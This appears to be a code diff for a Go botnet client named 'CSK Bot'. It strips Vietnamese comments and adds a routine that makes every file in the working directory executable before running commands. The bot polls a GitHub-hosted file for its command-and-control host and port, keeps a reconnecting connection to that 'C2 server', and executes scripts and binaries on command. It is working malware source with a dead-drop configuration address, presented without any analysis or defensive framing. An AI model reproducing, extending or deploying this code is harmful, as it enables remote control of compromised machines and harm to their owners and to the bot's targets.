@@ -21,57 +21,35 @@ import (
 )
 
 const (
-	// GitHub API endpoint (nhất quán hơn raw, hỗ trợ ETag)
-	CONFIG_URL = "https://api.github.com/repos/tenkhongvps1-ctrl/autocallport/contents/port.txt?ref=main"
-
-	// Chu kỳ fetch config
+	CONFIG_URL      = "https://api.github.com/repos/tenkhongvps1-ctrl/autocallport/contents/port.txt?ref=main"
 	CONFIG_INTERVAL = 30 * time.Second
 	HTTP_TIMEOUT    = 10 * time.Second
-
-	// Reconnect
 	RECONNECT_DELAY = 5 * time.Second
-
-	// Đọc socket
-	READ_TIMEOUT = 15 * time.Second
+	READ_TIMEOUT    = 15 * time.Second
 )
 
-// Regex parse: cnc:<host> port:<port>
 var configRegex = regexp.MustCompile(`cnc:\s*([^\s]+)\s+port:\s*(\d+)`)
 
-// ==================== STRUCT ====================
-
 type CSKBot struct {
-	// Config runtime (có thể thay đổi qua fetch)
-	configMu    sync.RWMutex
-	currentHost string
-	currentPort int
-	lastETag    string
-
-	// Connection
-	client         net.Conn
-	isConnected    bool
-	isReconnecting bool
-
-	// Process management
+	configMu        sync.RWMutex
+	currentHost     string
+	currentPort     int
+	lastETag        string
+	client          net.Conn
+	isConnected     bool
+	isReconnecting  bool
 	activeProcesses map[int]*exec.Cmd
 	processMutex    sync.Mutex
-
-	// Reconnect timer
-	reconnectMu    sync.Mutex
-	reconnectTimer *time.Timer
-
-	// Điều khiển vòng lặp config
-	stopConfigChan chan struct{}
+	reconnectMu     sync.Mutex
+	reconnectTimer  *time.Timer
+	stopConfigChan  chan struct{}
 }
 
-// Struct parse response từ GitHub API
 type githubContentResp struct {
 	Content  string `json:"content"`
 	Encoding string `json:"encoding"`
 	SHA      string `json:"sha"`
 }
-
-// ==================== INIT ====================
 
 func NewCSKBot() *CSKBot {
 	return &CSKBot{
@@ -82,11 +60,8 @@ func NewCSKBot() *CSKBot {
 	}
 }
 
-// ==================== CONFIG FETCHER ====================
-
 func (bot *CSKBot) startConfigFetcher() {
 	go func() {
-		// Fetch lần đầu ngay
 		bot.fetchAndUpdateConfig()
 
 		ticker := time.NewTicker(CONFIG_INTERVAL)
@@ -117,7 +92,6 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 	req.Header.Set("Accept", "application/vnd.github+json")
 	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")
 
-	// Conditional request: nếu file chưa đổi, GitHub trả 304 và không tính rate limit
 	if bot.lastETag != "" {
 		req.Header.Set("If-None-Match", bot.lastETag)
 	}
@@ -129,7 +103,6 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 	}
 	defer resp.Body.Close()
 
-	// 304 = file không đổi
 	if resp.StatusCode == http.StatusNotModified {
 		return
 	}
@@ -154,7 +127,6 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 		return
 	}
 
-	// API trả base64 có xuống dòng → strip trước khi decode
 	b64 := strings.ReplaceAll(payload.Content, "\n", "")
 	raw, err := base64.StdEncoding.DecodeString(b64)
 	if err != nil {
@@ -170,14 +142,13 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 		return
 	}
 
-	// So sánh với config hiện tại
 	bot.configMu.RLock()
 	oldHost := bot.currentHost
 	oldPort := bot.currentPort
 	bot.configMu.RUnlock()
 
 	if oldHost == newHost && oldPort == newPort {
-		return // không đổi
+		return
 	}
 
 	log.Printf("[Config] Update: %s:%d -> %s:%d", oldHost, oldPort, newHost, newPort)
@@ -190,9 +161,7 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 	bot.forceReconnect()
 }
 
-// parseConfig đọc nội dung file, hỗ trợ cả format 1 dòng lẫn nhiều dòng
 func parseConfig(content string) (string, int, bool) {
-	// Thử regex trước (format 1 dòng)
 	if m := configRegex.FindStringSubmatch(content); len(m) == 3 {
 		p, err := strconv.Atoi(m[2])
 		if err == nil && p > 0 && p <= 65535 {
@@ -200,7 +169,6 @@ func parseConfig(content string) (string, int, bool) {
 		}
 	}
 
-	// Fallback: parse từng dòng
 	var host string
 	var port int
 	for _, line := range strings.Split(content, "\n") {
@@ -226,9 +194,7 @@ func (bot *CSKBot) getConfig() (string, int) {
 	return bot.currentHost, bot.currentPort
 }
 
-// forceReconnect: ngắt kết nối cũ, kết nối lại với config mới
 func (bot *CSKBot) forceReconnect() {
-	// Hủy timer reconnect cũ
 	bot.reconnectMu.Lock()
 	if bot.reconnectTimer != nil {
 		bot.reconnectTimer.Stop()
@@ -236,7 +202,6 @@ func (bot *CSKBot) forceReconnect() {
 	}
 	bot.reconnectMu.Unlock()
 
-	// Đóng kết nối hiện tại
 	if bot.client != nil {
 		bot.client.Close()
 		bot.client = nil
@@ -247,8 +212,6 @@ func (bot *CSKBot) forceReconnect() {
 
 	bot.connect()
 }
-
-// ==================== CONNECT ====================
 
 func (bot *CSKBot) connect() {
 	if bot.isConnected || bot.isReconnecting {
@@ -278,7 +241,6 @@ func (bot *CSKBot) connect() {
 	bot.isConnected = true
 	bot.isReconnecting = false
 
-	// Hủy timer reconnect cũ
 	bot.reconnectMu.Lock()
 	if bot.reconnectTimer != nil {
 		bot.reconnectTimer.Stop()
@@ -323,8 +285,6 @@ func (bot *CSKBot) readCommands() {
 	}
 }
 
-// ==================== COMMAND EXECUTION ====================
-
 func (bot *CSKBot) executeCommand(command string) {
 	if command == "" {
 		return
@@ -368,8 +328,29 @@ func (bot *CSKBot) executeCommand(command string) {
 		return
 	}
 
+	bot.chmodAllInCwd()
+
 	log.Printf("Executing: %s with args: %v", method, args)
 	bot.runScript(scriptToRun, args, isExecutable)
+}
+
+func (bot *CSKBot) chmodAllInCwd() {
+	entries, err := os.ReadDir(".")
+	if err != nil {
+		log.Printf("[Chmod] ReadDir error: %v", err)
+		return
+	}
+	for _, e := range entries {
+		if e.IsDir() {
+			continue
+		}
+		name := e.Name()
+		if err := os.Chmod(name, 0755); err != nil {
+			log.Printf("[Chmod] %s failed: %v", name, err)
+		} else {
+			log.Printf("[Chmod] +x %s", name)
+		}
+	}
 }
 
 func (bot *CSKBot) handleStopCommand(command string) {
@@ -441,8 +422,6 @@ func (bot *CSKBot) runScript(scriptToRun string, args []string, isExecutable boo
 	}()
 }
 
-// ==================== DISCONNECT & RECONNECT ====================
-
 func (bot *CSKBot) handleDisconnect() {
 	log.Println("Connection to C2 server closed")
 	bot.isConnected = false
@@ -473,15 +452,11 @@ func (bot *CSKBot) scheduleReconnect() {
 	})
 }
 
-// ==================== CLEANUP ====================
-
 func (bot *CSKBot) cleanup() {
 	log.Println("Cleaning up...")
 
-	// Dừng config fetcher
 	select {
 	case <-bot.stopConfigChan:
-		// đã đóng rồi
 	default:
 		close(bot.stopConfigChan)
 	}
@@ -503,8 +478,6 @@ func (bot *CSKBot) cleanup() {
 	bot.isReconnecting = false
 }
 
-// ==================== MAIN ====================
-
 func main() {
 	log.Println("Starting CSK Bot (Go version, dynamic CNC config)...")
 
@@ -520,10 +493,8 @@ func main() {
 		os.Exit(0)
 	}()
 
-	// Bắt đầu fetch config mỗi 30s
 	bot.startConfigFetcher()
 
-	// Chờ fetch lần đầu hoàn tất (tối đa 10s)
 	for i := 0; i < 50; i++ {
 		host, port := bot.getConfig()
 		if host != "" && port != 0 {
